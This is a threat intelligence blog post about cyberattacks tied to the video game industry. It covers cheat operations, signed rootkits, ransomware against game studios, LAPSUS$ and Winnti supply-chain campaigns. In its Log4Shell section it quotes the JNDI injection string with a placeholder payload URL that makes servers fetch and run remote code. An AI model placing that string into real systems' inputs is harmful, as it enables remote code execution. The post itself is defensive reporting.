The title of this blog is a homage to the film Tinker Tailor Soldier Spy and presents the fact
that video games and cheating is also tied to hacking and spying. It is a common trope in
cybersecurity that professionals first became interested in the field through an encounter
while playing games. Speaking personally, I first became enthralled with hacking in 2008 by
matching against some modders using hacked weapons while playing Halo 3 (my favourite
game of all time).
This blog aims to highlight why monitoring the video game industry is important for cyber
threat intelligence analysts hunting down the latest threats. Video games and hacking are
very intertwined. Many hackers start out by creating cheats for games, and have to play the
games to begin with to learn how to hack them.
There are also several notable incidents whereby hacking in video games escalated to
become critical issues for the software development industry and enterprise security realms.
This includes zero-day exploits, stolen code-signing certificates, rootkit development, and
supply-chain attacks, as well as ransomware and intellectual property theft.
The Video Game Cheating Industry

1/13

Cheating in video games is as old as the industry itself. However, nowadays cheating is a
massive multi-billion dollar underground economy. What was once only done by a small
group of hackers has evolved into massive criminal enterprises, selling Cheats-as-aService.
In March 2021, the BBC reported that Chinese police worked with Tencent to disrupt one of
the largest video-game-cheating operations ever. The perpetrators designed and sold cheats
for popular games, such as Overwatch and Call of Duty. Approximately $76m (£55m) in
revenue was made by the criminal business, which charged a subscription fee to
clients. Subscription prices for users began at around $10 a day, and up to $200 a month.
In June 2021, security researcher Karsten Hahn uncovered a new rootkit signed by
Microsoft. Later, Microsoft published a blog investigating a threat actor distributing a
malicious signed driver, dubbed the Netfilter rootkit, within gaming environments. The
operation was able to trick Microsoft into signing their code by submitting drivers for
certification through the Windows Hardware Compatibility Program. The implications here
were massive, however, the malicious actor’s activity was limited to the gaming sector
specifically in China. Microsoft also said they believed the aim of the driver was to gain an
advantage in games and possibly exploit other players by compromising their accounts
through common tools like keyloggers.
The type of malicious software (malware) like the Netfilter rootkit is common in the gaming
industry as to be able to defeat anti-cheat systems you often have to be running at a level
lower than the Windows operating system (OS), at the kernel-mode level.
Hackers in Games
One of the most critical events in recent gaming history was Log4Shell, a vulnerability also
known as CVE-2021-44228 with a CVSS score of 10.0. That was first uncovered by the
Alibaba Security team and disclosed on 9 December 2021 and was exploited immediately
afterwards by a range of threats, including botnets, ransomware, and advanced persistent
threat (APT) groups - but it all started in Minecraft. At the time of this writing, even five
months since it was initially disclosed, thousands of applications remain vulnerable to
Log4Shell.
Log4Shell was a zero-day exploit in the ubiquitous Apache Log4j logging library that if
exploited successfully could lead to remote code execution (RCE) on the targeted device.
Log4Shell is also trivial to exploit. It can be done so by pasting "${jndi:ldap://<URL to
payload>}" into an input field and waiting for Log4j to fetch the remote payload and execute
it, opening a backdoor on the affected system.
Using Log4Shell, hackers quickly began exploiting the popular video game, Minecraft. When
a user pasted the string into a message they could compromise the entire Minecraft server
and other players' systems. This soon became known as the "worst week in Minecraft

2/13

history". As soon as players began to see this message pop up on their screens panic
ensued.
As they began to realize the cause of this was the Log4Shell exploit others joined in and
began to leverage it malicious attacks in Minecraft, and in other games such as Dark Souls
3. This included exploiting Log4Shell to compromise other players' accounts and stealing or
destroying their in-game items, which can take months or years to acquire and can be worth
hundreds or thousands of real dollars.

Historical Cybersecurity Incidents In The Gaming industry
Video game developers and publishers receive many of the same threats that organizations
such as banks or governments may receive. To empathize the severity of the threat,
Microsoft has an entire division and security operations center (SOC) dedicated to protecting
the Xbox Live Network and development.
A variety of notable cybersecurity incidents that affected major household names are
as follows:
In 2003, Half Life 2's source was stolen after the email of Valve's co-founder Gabe
Newell was compromised and the entire Half Life 2 source tree was downloaded from
his computer
In October 2014, four people were charged in the US and one in Australia for their
alleged involvement in a hacking ring known as Xbox Underground that stole source
code and intellectual property from a variety of games companies and Microsoft
In October 2016, two teenage members of Lizard Squad and PoodleCorp were
arrested for launching Distributed Denial of Service (DDoS) attacks against Pokémon
GO servers and ruining gamers’ Christmas with a DDoS against the servers that power
PlayStation and Xbox consoles

3/13

In March 2019, Dr. Web researchers discovered 39% of all existing Counter-Strike 1.6
game servers were being used by malicious actors in attempts to infect players with the
Belonard Trojan botnet by exploiting game client vulnerabilities
In April 2020, the source code of Valve's Team Fortress 2 and Counter-Strike: Global
Offensive games was re-leaked on the Internet for anyone to download after already
being leaked in 2018
Also in April 2020, 160,000 Nintendo customer accounts getting hijacked via credential
stuffing, which led to Nintendo disconnecting NNID legacy login system from main
Nintendo profiles
In December 2021, security researchers disclosed that they found several sets
Amazon Web Services (AWS) keys in an exposed affected S3 bucket, with which it was
possible scripts run and upload files to domains of SEGA Europe
The Game Industry Is Targeted By Organized Cybercriminals
Like any software development company, many large games companies will have corporate
networks that can be targeted by cybercriminals and advanced persistent threat (APT)
groups for extortion or intellectual property theft. There have been a number of high-profile
and painful ransomware attacks against household names. Chinese-speaking APT groups
have also targeted games companies for a variety of reasons, including intellectual property
theft and important artefacts such as code-signing certificates. These incidents are a lot
more serious than account hijacking or cheating, they verge into the corporate espionage
and organized cybercrime realms.
Crytek and Ubisoft
In October 2020, video game developer Crytek was victim to an Egregor ransomware attack,
which subsequently also reportedly affected Ubisoft. In addition to encrypting devices on
Crytek's network, the Egregor operators stole unencrypted files from the company and
leaked a 380MB archive on its darknet leak site containing data from WarFace and Crytek's
cancelled Arena of Fate MOBA game. The Egregor operators also managed to allegedly
steal data pertaining to Ubisoft's Watch Dogs: Legion game (which is ironically all about
hacking). On 28 October, Egregor posted a 500GB archive containing assets from the game.

Figure 2. Ubisoft and Crytek appearing on Egregor's darknet leak site
Egregor ransomware appeared in September 2020 and was the heir apparent to the
infamous Maze ransomware group, which first emerged in May 2019. Both Egregor and
Maze, as well as Sekhmet, were attributed to the same group of organized cybercriminals
tracked altogether as the TwistedSpider cryptonym by CrowdStrike. For Egregor, initial
access was gained through the use of the QakBot banking Trojan, the targeting of unpatched
Virtual Private Network (VPN) appliances, and Remote Desktop Protocol (RDP) services. In
February 2022, 14 months since the group shuttered its data leak sites and ceased attacks,
the master decryption keys for the Maze, Egregor, and Sekhmet ransomware operations
were released on the BleepingComputer forums by the alleged malware developer.
CAPCOM

5/13

Japanese games developer Capcom is well-known for its iconic game franchises, including
Street Fighter, Resident Evil, Devil May Cry, Monster Hunter, and Mega Man. In November
2020, the company announced it was hit by a crippling ransomware attack. The attack was
orchestrated by the RagnarLocker group (aka VikingSpider), a Russian-speaking organized
cybercriminal group. The threat group's previous victims include Energias de Portugal, CMA
CGM, and Campari. In each case, the group demanded between $10-$15 million in ransom
for the decryption keys and to prevent stolen data from being published on the group's data
leak blog hosted on the darknet.
The RagnarLocker threat actors claimed in the ransom note (see Figure 2) they stole up to
1TB of sensitive data from Capcom's corporate networks in Japan, the US, and Canada.
This included intellectual property, employee personal data, sensitive emails, and nondisclosure agreements. The group also threatened to leak and/or sell the stolen data if the
ransom is not paid. Further, enclosed in the ransom note are screenshots of stolen files as
well as including a list of Active Directory Users and Computers for the Capcom Windows
domain. Security researcher Pancak3 also told BleepingComputer that RagnarLocker
claimed to have encrypted up to 2,000 devices on Capcom's networks and are demanding
$11 million in Bitcoins for a decryptor.

Figure 3. RagnarLocker ransom note and leak site targeting Capcom
In January 2021, Capcom made a statement on the breach and disclosed that it suspected
the data of up to 390,000 people was likely stolen. Capcom says the exposed data could be
a mix of names, addresses, phone numbers, HR information, and email addresses. In April
2021, Capcom released a final statement on the November 2020 RagnarLocker ransomware
incident. The company says it had recovered from the attack, around six months since the
incident started. Capcom's final assessment regarding the data breach is that only 15,649
individuals were impacted who were notified of their exposure. Stolen information also did
not include payment card details, only corporate and personally identifiable data. Digital
forensics experts also identified that the Ragnar Locker operators gained initial access to
Capcom’s internal network by exploiting a vulnerability in an unpatched VPN device located

at the company’s North American subsidiary in California. From there, the adversary pivoted
to devices in offices in the US and Japan and executed the ransomware on 1 November
2020, causing email and file servers to be taken offline.
CD PROJEKT RED
On 9 February 2021, creators of the popular Witcher game series and Cyberpunk 2077, CD
Projekt Red (CDPR), announced it was the victim of a ransomware attack by a threat group
using a variant Emsisoft's Fabian Wosar identified as HelloKitty (aka DeathKitty). The threat
group responsible also claimed in the ransom note (see Figure 3) to have stolen the source
code from several of CDPR's games.
The next day, on 10 February, vx-underground tweeted that CDPR's data had been leaked
to an infamous Russian-speaking cybercrime forum known as Exploit[.]in. VICE Motherboard
journalists obtained a copy of the data on a low level hacking and data trading forum and
downloaded it for verification purposes. The data included assets from CDPR's Witcher spin
off game, Gwent. The cybercriminals responsible then posted about an auction of the data
for "1kk$" (which reportedly equals $1 million in underground Russian cybercriminal slang).

From the start, CDPR did not submit to the cybercriminal's demands. CDPR's statement at
the time said "We will not give in to the demands nor negotiate with the actor, being aware
that this may eventually lead to the release of the compromised data." The company added
that the hackers had "successfully encrypted some devices" on CDPR's network, but that the
company had backups and begun restoring the data.
Electronic Arts
In June 2021, Electronic Arts (EA) fell victim to a sophisticated social engineering attack that
led to the theft of up to 780GB of proprietary source code from the FIFA franchise and its
Frostbite game engine. The hacker and their associates are part of a group, which later
dubbed itself LAPSUS$, would go on to wreak havoc at top companies such as Microsoft,
Nvidia, Vodafone, and Okta, as well as Ubisoft according to its Telegram channel.

8/13

EA confirmed to VICE Motherboard that it had suffered a data breach and that the
information listed by the hackers was the data that was stolen. The disturbing breach at EA
was indicative of things to come. The LAPSUS$ group used a combination of social
engineering, cybercrime underground markets selling stolen credentials and cookies, SIM
swapping, and some uncomplex techniques to compromise Windows systems.
A leaked incident response report disclosed showed that once a LAPSUS$ member gained
access to a compromised Windows system via RDP, they would use Microsoft Bing to
download hacking tools and exploits, such as ProcessHacker and Mimikatz, from Github to
turn off the victim's Endpoint Detection and Response (EDR) protection and dump
credentials from the system's memory and then copied to Pastebin.

Figure 5. Threat actors connected to LAPSUS$ advertise stolen EA source code
What made LAPSUS$ so interesting is that their unique set of skills proved to be highly
effective against companies with some of the best enterprise security defences in the world.
These teenage hackers began by targeting a games company and went on to hit a company
like Okta, which is used by hundreds of not only the Fortune 500, but also governments
worldwide. The motivation of LAPSUS$ appeared to be for financial gains, however, as the
hacks got more brazen it seemingly became a quest for notoriety and infamy. The group had
a Telegram channel with up to 47,000 subscribers and would brag about each hack on
it. Ultimately, on 24 March 2022, British police arrested seven suspects between the ages of
16 and 21 reportedly part of the gang.
The story did not end there though. On 30 March, LAPSUS$ posted details about another
breach against a software consultancy giant Globant, where the group had stolen 70GB of
data, including customer source code. Further, on 22 April, KrebsOnSecurity obtained a copy
of the private chat messages between members of the LAPSUS$ cybercrime group. The
leaked chats revealed that LAPSUS$ also breached T-Mobile (Deutsch Telekom) multiple
times in March 2022, stealing source code for a range of company projects.

9/13

Another disturbing revelation to come out of the LAPSUS$ campaign was the group's use of
fake emergency data requests. This is where these cybercriminals could successfully use a
hacked police or government department email account to request emergency access to
personal subscriber information from internet service providers, phone companies and social
media firms via the pretext that the request does not require a warrant because somebody's
life is at risk. The companies would often comply due to it being an emergency and coming
from a legitimate but compromised government or police email address.
APTs Hacking Games Companies For Espionage And Profit
Since at least 2009, a sophisticated Chinese hacking group known as Winnti has targeted
the gaming industry. The Winnti threat group's other cryptonyms include APT41, BARIUM,
WickedPanda, and WickedSpider. The gaming industry is not Winnti's only target, however,
as the group has infiltrated over 100 victim companies in the US and abroad, including
software development companies, computer hardware manufacturers, telecommunications
providers, social media companies, non-profit organizations, universities, think tanks, and
foreign governments, as well as pro-democracy politicians and activists in Hong Kong. Five
members of APT41 were indicted by the US Department of Justice in September 2020 with
an additional two members arrested in Malaysia. US prosecutors accused the two of working
on behalf of the Chinese government’s intelligence agency, the Guangdong State Security
Department (GSSD) of the Ministry of State Security (MSS).
In April 2013, Kaspersky disclosed a report called “Winnti - More than just a game". The
researchers reported that in Q3 2011, the Winnti group's malware was detected on a large
number of computers that were linked together through the mutual use by players of a
popular online game. It was later revealed that the malware landed on the players' systems
as part of a regular update from the game's official update server. Making it one of the first of
several software supply-chain attacks orchestrated by this threat group. APT41 would go on
to orchestrate the infamous CCleaner supply-chain attack years later in September 2017.
Kaspersky researchers uncovered that the digital signature used to sign the original Winnti
malware was stolen from another video game vendor known as KOG, based in South Korea.
The researchers then found that between 2011 and 2013, the Winnti group had used at least
18 stolen code-signing certificates in its campaigns all belonging to video games companies
from South Korea, Japan, the Philippines, China, and the US.

Figure 6. APT41 indicted by the Department of Justice in September 2020
Hacking video games companies by a sophisticated state-sponsored adversary seemed
unusual. This was due to the fact that during the same timeframe Chinese APTs had
targeted Google, Adobe, and the New York Times. Many security experts were curious why
Chinese intelligence agencies were heavily investing resources into hacking games
companies.
Potential Winnti objectives for targeting the gaming industry:
Objective 1 - Online games could be exploited to accumulate in-game currency, which
could be resold for real currency
Objective 2 - Source code theft could be used to find exploits in the software to
support Objective 1
Objective 3 - Having zero-day exploits in any software is advantageous for an
intelligence agency as it grants the ability to target other organizations and individuals
Objective 4 - Stealing personal customer data
Objective 5 - Stealing software inventions and innovations to support other industries,
such as military combat simulators
Objective 6 - Stealing intellectual property to reproduce in their own domestic gaming
industry
Objective 7 - Repurposing resources like code-signing certificates and email accounts
for other cyber-espionage campaigns
Additionally, in March 2019 and April 2020, security researchers from ESET and
QuoIntelligence, respectively, disclosed further campaigns linked to the Winnti group against
the video games industry. Indicating that these adversaries continue to spy on games
companies, primarily in Asia, up to 10 years later since the campaign began.
11/13

In March 2021, ESET also disclosed another campaign reminiscent of previous Winnti
attacks but did not formally attribute it to the APT group. The researchers uncovered a
software supply-chain attack against emulation software, NoxPlayer, to install surveillance
malware on the computers of online gamers. The maker of NoxPlayer, BigNox, says the
software has 150 million users in 150 countries. The infrastructure of BigNox, was reportedly
compromised by an adversary to push a malicious update. And, in some cases, additional
payloads were downloaded by the BigNox updater from attacker-controlled servers.
So What?
Hopefully this blog highlights the fact that it is particularly important to monitor the cyber
threat landscape of the gaming industry. There have been several occasions where a cyber
incident began in the gaming sector and eventually worked its way to the software industry,
and thus all other sectors are affected by it. The Log4Shell event, several software supplychain attacks, digital certificate theft campaigns, and intellectual property theft campaigns,
among others. Although these incidents may have started in the gaming industry it eventually
affected top companies, such as Microsoft.
In my experience, hackers have often started out by hacking their favourite game. They
either reverse engineer it themselves, learn from others, or encounter other hackers online.
This then leads to cheating and/or selling cheats and techniques, and potentially zero-day
exploit development. Although some of these larger cheating shops may possess the ability
to discover a zero-day vulnerability or develop a Proof-of-Concept (PoC) exploit to support
their cheats, there are much larger ramifications affecting the entire enterprise IT ecosystem.
Key reasons to monitor the gaming industry cyber threat landscape:
From a Cyber Threat Intelligence (CTI) perspective, it can be useful to monitor hacking
activities in the gaming communities as it can sometimes lead to corporate enterprise
security
Also from a CTI perspective, the tactics, techniques, and procedures (TTPs) that affect
video game companies will affect the software industry, and thus all other sectors
From a detection engineering perspective, monitoring the cheating industry for the
latest rootkit developments and bypassing anti-cheat systems is important to identify
the latest techniques leveraged in the wild for bypassing defences
From a software development perspective, it would also be useful to monitor the
development of bypasses for copyright protection and anti-piracy protections of games
